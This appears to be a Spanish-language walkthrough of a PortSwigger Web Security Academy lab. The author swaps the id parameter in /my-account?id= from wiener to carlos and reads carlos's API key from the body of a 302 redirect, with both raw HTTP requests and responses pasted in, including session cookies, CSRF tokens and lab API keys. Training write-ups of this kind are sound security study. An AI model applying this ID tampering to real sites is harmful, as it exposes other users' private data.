# 🤔 Laboratorio: ID de usuario controlado por parámetro de solicitud con fuga de datos en redirección

Esta práctica de laboratorio contiene una vulnerabilidad de control de acceso donde se filtra información confidencial en el cuerpo de una respuesta de redireccionamiento.

Para resolver la práctica de laboratorio, obtenga la clave API para el usuario carlosy envíela como solución.

Puede iniciar sesión en su propia cuenta utilizando las siguientes credenciales:wiener:peter



RESOLUCIÓN:

VERIFICAMOS EL PARAMETRO DE /my-account?id= Y VEMOS QUE LA RESPONSE DE ESA SOLIICITUD QUE LA HACE SOBRE NUESTRO USUARIO WIENER NOS TRAE NUESTRA CLAVE API ASI QUE INTENTAMOS MODIFICAR EL VALOS DEL PARAMETRO POR EL SUAURIO CARLOS Y BINGO OBTUVIMOS SU CLAVE API EN LA RESPONSE QUE NOS DIO CON CODIGO 302 DE REDIRECCION DIVULGADO EN SU DATA DE HTML DEL USUARIO CARLOS CON EL QUE NO ESTAMOS LOGUEADOS PERO NOS EXPUSO EN LA REDIRECCION SU CLAVE API Y NOS ENVIO A LOGUEARNO, AUNQUE YA OBTUVIMOS LA INFO QUE QUERIAMO POR ESTA VULNERABILIDAD.

```python
// pyth

---------------------


REQUEST NORMAL:

GET /my-account?id=wiener HTTP/2
Host: 0a3c00da0431d48083c1416f006a002e.web-security-academy.net
Cookie: session=7PyLrYRZp9LsseJfMXx4NsfTwXDq27RW
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a3c00da0431d48083c1416f006a002e.web-security-academy.net/login
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers


RESPONSE NORMAL:

HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
Cache-Control: no-cache
X-Frame-Options: SAMEORIGIN
Content-Length: 3655

<!DOCTYPE html>
<html>
    <head>
        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>
        <link href=/resources/css/labs.css rel=stylesheet>
        <title>User ID controlled by request parameter with data leakage in redirect</title>
    </head>
    <body>
        <script src="/resources/labheader/js/labHeader.js"></script>
        <div id="academyLabHeader">
            <section class='academyLabBanner'>
                <div class=container>
                    <div class=logo></div>
                        <div class=title-container>
                            <h2>User ID controlled by request parameter with data leakage in redirect </h2>
                            <button id='submitSolution' class='button' method='POST' path='/submitSolution' parameter='answer' >Submit solution</button>
                            <script src='/resources/labheader/js/submitSolution.js'></script>
                            <a class=link-back href='https://portswigger.net/web-security/access-control/lab-user-id-controlled-by-request-parameter-with-data-leakage-in-redirect'>
                                Back&nbsp;to&nbsp;lab&nbsp;description&nbsp;
                                <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
                                    <g>
                                        <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
                                        <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
                                    </g>
                                </svg>
                            </a>
                        </div>
                        <div class='widgetcontainer-lab-status is-notsolved'>
                            <span>LAB</span>
                            <p>Not solved</p>
                            <span class=lab-status-icon></span>
                        </div>
                    </div>
                </div>
            </section>
        </div>
        <div theme="">
            <section class="maincontainer">
                <div class="container is-page">
                    <header class="navigation-header">
                        <section class="top-links">
                            <a href=/>Home</a><p>|</p>
                            <a href="/my-account?id=wiener">My account</a><p>|</p>
                            <a href="/logout">Log out</a><p>|</p>
                        </section>
                    </header>
                    <header class="notification-header">
                    </header>
                    <h1>My Account</h1>
                    <div id=account-content>
                        <p>Your username is: wiener</p>
                        <div>Your API Key is: MqG3QHiWEGmuwW8uybtUmW1W8aKm959k</div><br/>
                        <form class="login-form" name="change-email-form" action="/my-account/change-email" method="POST">
                            <label>Email</label>
                            <input required type="email" name="email" value="">
                            <input required type="hidden" name="csrf" value="rSVykegVMceta1Np7G32NjxYMVnyyVi9">
                            <button class='button' type='submit'> Update email </button>
                        </form>
                    </div>
                </div>
            </section>
            <div class="footer-wrapper">
            </div>
        </div>
    </body>
</html>


---------------




REQUEST CON USARIO CARLOS:



GET /my-account?id=carlos HTTP/2
Host: 0a3c00da0431d48083c1416f006a002e.web-security-academy.net
Cookie: session=7PyLrYRZp9LsseJfMXx4NsfTwXDq27RW
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a3c00da0431d48083c1416f006a002e.web-security-academy.net/login
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers


RESPONSE CON SUUARIO CARLOS:

HTTP/2 302 Found
Location: /login
Content-Type: text/html; charset=utf-8
Cache-Control: no-cache
X-Frame-Options: SAMEORIGIN
Content-Length: 3655

<!DOCTYPE html>
<html>
    <head>
        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>
        <link href=/resources/css/labs.css rel=stylesheet>
        <title>User ID controlled by request parameter with data leakage in redirect</title>
    </head>
    <body>
        <script src="/resources/labheader/js/labHeader.js"></script>
        <div id="academyLabHeader">
            <section class='academyLabBanner'>
                <div class=container>
                    <div class=logo></div>
                        <div class=title-container>
                            <h2>User ID controlled by request parameter with data leakage in redirect </h2>
                            <button id='submitSolution' class='button' method='POST' path='/submitSolution' parameter='answer' >Submit solution</button>
                            <script src='/resources/labheader/js/submitSolution.js'></script>
                            <a class=link-back href='https://portswigger.net/web-security/access-control/lab-user-id-controlled-by-request-parameter-with-data-leakage-in-redirect'>
                                Back&nbsp;to&nbsp;lab&nbsp;description&nbsp;
                                <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
                                    <g>
                                        <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
                                        <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
                                    </g>
                                </svg>
                            </a>
                        </div>
                        <div class='widgetcontainer-lab-status is-notsolved'>
                            <span>LAB</span>
                            <p>Not solved</p>
                            <span class=lab-status-icon></span>
                        </div>
                    </div>
                </div>
            </section>
        </div>
        <div theme="">
            <section class="maincontainer">
                <div class="container is-page">
                    <header class="navigation-header">
                        <section class="top-links">
                            <a href=/>Home</a><p>|</p>
                            <a href="/my-account?id=wiener">My account</a><p>|</p>
                            <a href="/logout">Log out</a><p>|</p>
                        </section>
                    </header>
                    <header class="notification-header">
                    </header>
                    <h1>My Account</h1>
                    <div id=account-content>
                        <p>Your username is: carlos</p>
                        <div>Your API Key is: t9c03LY5WWRmSbKHJ0CU4Ef7aOgYzxsV</div><br/>
                        <form class="login-form" name="change-email-form" action="/my-account/change-email" method="POST">
                            <label>Email</label>
                            <input required type="email" name="email" value="">
                            <input required type="hidden" name="csrf" value="rSVykegVMceta1Np7G32NjxYMVnyyVi9">
                            <button class='button' type='submit'> Update email </button>
                        </form>
                    </div>
                </div>
            </section>
            <div class="footer-wrapper">
            </div>
        </div>
    </body>
</html>




Your API Key is: t9c03LY5WWRmSbKHJ0CU4Ef7aOgYzxsV

 

------------
```

